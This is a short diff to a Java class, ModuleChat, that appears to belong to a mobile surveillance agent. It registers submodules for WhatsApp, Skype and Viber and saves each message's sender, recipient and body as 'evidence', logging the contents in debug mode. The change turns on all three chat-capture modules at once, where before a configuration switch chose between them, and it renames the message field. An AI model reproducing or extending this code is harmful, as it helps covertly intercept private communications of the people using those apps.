@@ -61,13 +61,12 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 
 	public ModuleChat() {
 		subModuleManager = new SubModuleManager(this);
-		
-		if(!Cfg.ENABLE_EXPERIMENTAL_MODULES){
-			subModuleManager.add(new ChatWhatsapp());
-			subModuleManager.add(new ChatSkype());
-		}else{
-			subModuleManager.add(new ChatViber());
-		}
+
+		subModuleManager.add(new ChatWhatsapp());
+		subModuleManager.add(new ChatSkype());
+
+		subModuleManager.add(new ChatViber());
+
 	}
 
 	@Override
@@ -139,12 +138,12 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 			// TO DISPLAY
 			items.add(WChar.getBytes(message.to, true));
 			// CONTENT
-			items.add(WChar.getBytes(message.message, true));
+			items.add(WChar.getBytes(message.body, true));
 			items.add(ByteArray.intToByteArray(EvidenceReference.E_DELIMITER));
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (saveEvidence): " + datetime.toString() + " " + message.from + " -> " + message.to + " : "
-						+ message.message);
+				Check.log(TAG + " (saveEvidence): " + datetime.toString() + " " + message.from + " -> " + message.to
+						+ " : " + message.body);
 			}
 		}
 
